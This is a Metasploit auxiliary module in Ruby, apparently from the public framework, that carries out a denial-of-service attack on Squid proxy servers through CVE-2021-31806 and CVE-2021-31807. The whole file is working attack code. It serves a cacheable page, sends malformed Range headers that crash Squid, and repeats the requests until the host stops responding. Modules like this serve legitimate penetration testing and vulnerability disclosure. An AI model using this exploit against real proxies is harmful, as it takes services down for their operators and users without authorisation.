##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Squid Proxy Range Header DoS',
        'Description' => %q{
          The range handler in The Squid Caching Proxy Server 3.0-4.1.4 and
          5.0.1-5.0.5 suffers from multiple vulnerabilities triggered
          by specific HTTP requests and responses.

          These vulnerabilities allow remote attackers to cause a
          denial of service through specifically crafted requests.
        },
        'Author' => [
          'Joshua Rogers' # Discoverer, and Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['DOS', { 'Description' => 'Perform Denial of Service Against The Target' }]
        ],
        'DefaultAction' => 'DOS',
        'References' => [
          [ 'CVE', '2021-31806'],
          [ 'CVE', '2021-31807'],
          [ 'URL', 'https://blogs.opera.com/security/2021/10/fuzzing-http-proxies-squid-part-2/']
        ],
        'DisclosureDate' => '2021-05-27',
        'Notes' => {
          'Stability' => [ CRASH_SERVICE_DOWN ],
          'Reliability' => [ ],
          'SideEffects' => [ IOC_IN_LOGS ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(3128),
        OptInt.new('REQUEST_COUNT', [ true, 'The number of requests to be sent, as well as the number of re-tries to confirm a dead host', 50 ]),
        OptEnum.new('CVE', [
          true, 'CVE to check/exploit', 'CVE-2021-31806',
          ['CVE-2021-31806', 'CVE-2021-31807']
        ]),
      ]
    )
  end

  def on_request_uri(cli, _request)
    # The Last-Modified response header must be set such that Squid caches the page.
    send_response(cli, '<html></html>', { 'Last-Modified' => 'Mon, 01 Jan 2020 00:00:00 GMT' })
  end

  def run
    count = 0
    error_count = 0 # The amount of connection errors from the server.
    reqs = datastore['REQUEST_COUNT'] # The maximum amount of requests (with a valid response) to the server.

    print_status("Sending #{reqs} DoS requests to #{peer}")

    start_service

    while reqs > count
      begin
        res = req(datastore['CVE'])
      rescue Errno::ECONNRESET
        res = nil
      end

      if res && (res.code == 200) && (count == 0)
        count = 1
        print_status("Sent first request to #{rhost}:#{rport}")
      elsif res
        print_status("Sent DoS request #{count} to #{rhost}:#{rport}")
        count += 1
        error_count = 0

        next # Host could be completely dead, or just waiting for another Squid child.
      elsif count == 0
        print_error('Cannot connect to host.')
        return
      end

      error_count += 1
      next unless error_count > reqs # If we cannot connect after `res` amount of attempts, assume the DoS was successful.

      print_good('DoS completely successful.')
      report_vuln(
        host: rhost,
        port: rport,
        name: name,
        refs: references
      )
      return
    end
    print_error('Looks like the host is not vulnerable.')
  end

  def req(cve)
    case cve
    when 'CVE-2021-31806'
      sploit = cve_2021_31806
    when 'CVE-2021-31807'
      sploit = cve_2021_31807
    end

    send_request_raw({
      'uri' => get_uri,
      'headers' => {
        'Host' => "#{srvhost_addr}:#{srvport}",
        'Range' => sploit,
        'Cache-Control' => 'public'
      }
    })
  end

  def cve_2021_31806
    # This will cause Squid to assert with "http->out.offset <= start"
    %(bytes=0-0,-0,-1)
  end

  def cve_2021_31807
    # This will cause Squid to assert with "!http->range_iter.debt() == !http->range_iter.currentSpec()"
    %(bytes=0-0,-4,-0)
  end

end
